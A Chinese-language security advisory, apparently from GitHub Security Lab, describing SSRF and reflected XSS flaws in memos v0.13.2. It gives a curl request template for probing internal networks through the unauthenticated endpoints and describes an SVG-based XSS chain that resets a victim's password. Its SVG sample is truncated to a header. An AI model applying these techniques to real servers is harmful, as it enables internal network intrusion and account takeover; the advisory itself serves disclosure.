# GHSL-2023-154_GHSL-2023-156: Memos API中的服务器端请求伪造（SSRF）和跨站脚本（XSS）漏洞

## 概述
在memos API服务中发现多种SSRF漏洞，允许用户在未经身份验证或已验证的情况下访问内部网络。这些漏洞可能导致敏感信息泄漏，并可能使攻击者获得管理员账户的控制权。

### 关键术语
- **SSRF（服务器端请求伪造）**：攻击者通过服务器发起请求，从而访问内部网络或其他服务器。
- **XSS（跨站脚本）**：攻击者向网页插入恶意脚本，当用户访问该页面时，脚本会在用户的浏览器中执行。

## 受影响版本
- **memos**：v0.13.2

## 漏洞详情
1. **/o/get/httpmeta**：此端点允许未经身份验证的用户列举内部网络的信息，并以JSON格式返回部分HTML值。
   
2. **/o/get/image**：此端点允许未经身份验证的用户获取内部网络的图像。该请求的响应包含了用户请求结果，导致反射性XSS漏洞。

3. **/api/resource**：此端点允许经过身份验证的用户列举内部网络的信息。

### 漏洞影响
- **信息泄露**：SSRF可导致内部网络信息被暴露。
- **权限提升**：XSS可使攻击者模仿管理员登录。

## 漏洞示例
### SSRF 示例
- **未验证用户访问**：
  ```
  curl http://0.0.0.0:5230/o/get/<endpoint>?url=<full url>
  ```

- **已验证用户访问**：
  登录到memos -> 资源 -> 创建资源 -> 选择外部链接并输入完整URL。同时确保请求中的`downloadToLocal`值为`true`。

### XSS 示例
攻击者可以托管一个SVG文件。当用户（管理员或普通用户）点击以下链接时，用户密码将被更改为“password”，攻击者可以登录：
```
http://0.0.0.0:5230/o/get/image?url=<攻击者控制的svg文件url>
```
SVG文件示例：
```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
```

## 联系信息
此漏洞由GHSL团队成员@Kwstubbs（Kevin Stubbings）发现并报告，使用了CodeQL工具。如对这些漏洞有疑问，请联系GHSL团队：securitylab@github.com，并在沟通中提及GHSL-2023-154、GHSL-2023-155或GHSL-2023-156。